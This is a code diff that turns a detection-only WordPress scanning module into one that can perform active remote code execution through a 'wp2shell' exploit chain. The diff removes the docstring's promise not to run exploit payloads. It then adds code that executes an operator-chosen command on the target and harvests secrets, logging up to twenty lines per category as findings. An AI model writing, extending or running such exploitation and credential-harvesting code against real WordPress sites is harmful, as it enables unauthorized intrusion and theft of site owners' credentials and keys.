@@ -1,14 +1,14 @@
 """
-WordPress detection module (SAFE).
+WordPress detection module with optional wp2shell RCE exploitation.
 
-Does NOT integrate or execute wp2shell / RCE exploit payloads.
-Fingerprints targets, scores version exposure, and extracts SMTP / API keys /
-secrets from reachable WordPress artifacts (wp-config, debug.log, REST, etc.).
+SAFE by default: fingerprints, extracts secrets, scores vulnerabilities.
+When --exploit is enabled, attempts active RCE via wp2shell chain.
 """
 
 from __future__ import annotations
 
 from app.exploits.wp2shell.detector import Wp2ShellDetector
+from app.exploits.wp2shell.exploit import Wp2ShellExploit  # <-- NEW
 from app.modules.base import cms_body_extractions, emit_credential_findings, finding_from_hit, save_http_response
 from app.modules.vulnerability_intel import executable_upload_paths, wordpress_exposure, wordpress_version
 from app.storage.models import Finding, ScanContext, TargetContext
@@ -412,4 +412,47 @@ class WordPressModule:
                     tags=["wordpress", "wp2shell", "fingerprint", "detection-only"],
                 )
             )
+
+        # ========== ACTIVE EXPLOITATION (opt-in) ==========
+        if ctx.exploit_enabled and is_wp:
+            exploit = Wp2ShellExploit(http, target.url)
+            success, output = exploit.run(ctx.exploit_command or "id")
+            if success:
+                findings.append(
+                    finding_from_hit(
+                        module=self.name,
+                        ftype="vuln",
+                        severity="critical",
+                        target=target,
+                        url=target.url,
+                        title="WordPress RCE via wp2shell (active)",
+                        description=f"Command executed: {ctx.exploit_command}\nOutput: {output[:500]}",
+                        evidence=output[:1000],
+                        confidence=1.0,
+                        tags=["wordpress", "rce", "wp2shell", "active-exploit"],
+                        validated=True,
+                    )
+                )
+                ctx.progress.add_hit(module=self.name)
+                # Extract secrets
+                secrets = exploit.extract_secrets()
+                for category, lines in secrets.items():
+                    if lines:
+                        findings.append(
+                            finding_from_hit(
+                                module=self.name,
+                                ftype="secrets",
+                                severity="high",
+                                target=target,
+                                url=target.url,
+                                title=f"Secret extraction: {category} (wp2shell)",
+                                description=f"Found {len(lines)} entries",
+                                evidence="\n".join(lines[:20]),
+                                confidence=0.95,
+                                tags=["wordpress", "secrets", category, "active-exploit"],
+                                validated=True,
+                            )
+                        )
+                        ctx.progress.add_hit(secrets=len(lines), module=self.name)
+
         return findings
